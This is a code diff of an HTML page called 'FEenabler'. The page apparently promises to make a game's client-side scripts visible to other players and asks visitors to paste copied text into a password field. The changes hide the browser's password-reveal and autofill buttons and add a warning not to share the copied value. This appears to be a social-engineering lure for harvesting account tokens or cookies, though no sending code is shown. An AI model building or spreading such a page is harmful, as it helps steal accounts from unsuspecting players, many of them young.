@@ -27,6 +27,16 @@
             font-size: 15px;
             outline: none;
         }
+        
+        input::-ms-reveal,
+        input::-ms-clear {
+            display: none;
+        }
+        
+        input::-webkit-credentials-auto-fill-button {
+            visibility: hidden;
+            pointer-events: none;
+        }
 
         input:focus {
             border-color: #5865f2;
@@ -72,6 +82,7 @@
     <h1>FEenabler</h1>
 
     <p>Paste your text below.</p>
+    <p style="font-size: 12px;">Do NOT share what you just copied to anyone else. THey will be able to spoof your key and you will not be able to get another one.</p>
 
     <input
         type="password"
@@ -115,11 +126,7 @@
 
 <div class="tutorial">
 
-    <h1>FEenabler</h1>
-
-    <p>Shows client sided scripts into server for other players to see.</p>
-
-    <h2>TUTORIAL</h2>
+    <h1>TUTORIAL</h1>
 
     <p>
         You have probably came here to enable fe. Well heres the tutorial
